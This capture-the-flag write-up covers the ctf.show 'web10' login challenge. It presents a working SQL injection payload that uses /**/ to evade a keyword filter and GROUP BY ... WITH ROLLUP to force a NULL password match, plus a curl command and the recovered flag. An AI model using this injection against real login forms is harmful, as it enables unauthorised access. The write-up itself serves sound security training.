---
title: "ctf.show web10"
ctf: "ctf.show"
date: 2026-04-20
category: web
difficulty: easy
points: 10
flag_format: "ctfshow{...}"
author: "orgarchorg"
---

# ctf.show web10

## Summary

This is a login SQL injection challenge with source disclosure at `index.phps`. The filter blocks common keywords and spaces, but the query only filters on `username`, while password comparison happens later in PHP, so the clean solution is to inject `GROUP BY ... WITH ROLLUP` and force a `NULL` password row.

## Solution

### Step 1: Read the source and identify the real constraint

The leaked source shows:

```php
$sql="select * from user where username = '$username'";
$result=mysqli_query($con,$sql);
if(mysqli_num_rows($result)>0){
    while($row=mysqli_fetch_assoc($result)){
        if($password==$row['password']){
            echo "登陆成功<br>";
            echo $flag;
        }
    }
}
```

Important details:

- `username` is injectable inside single quotes.
- The blacklist removes `select|from|where|join|sleep|and|\\s|union|,`.
- Password is not checked in SQL, only in PHP with `==`.

So ordinary auth bypass is not enough. We need the query to return a row whose `password` becomes `NULL`, then make PHP compare `NULL == NULL`.

### Step 2: Use `WITH ROLLUP` to create a `NULL` password row

Spaces are blocked, so use `/**/` instead. This payload works:

```text
admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#
```

It turns the query into:

```sql
select * from user
where username = 'admin' or 1=1
group by password with rollup
#'
```

`WITH ROLLUP` appends a summary row where grouped columns become `NULL`, so one returned row has `password = NULL`.

The last trick is not to submit the `password` field at all. In PHP that leaves `$password` as `NULL`, so:

```php
$password == $row['password']
```

becomes `NULL == NULL`, which passes and prints the flag.

```bash
curl -skL -X POST 'https://7acf1820-e09e-44d5-bae0-171a3153e4d7.challenge.ctf.show/' \
  --data-urlencode "username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#"
```

Example output:

```text
登陆成功
ctfshow{7671695b-ed19-4c21-93e4-42922d38308a}
```

## Flag

```text
ctfshow{7671695b-ed19-4c21-93e4-42922d38308a}
```
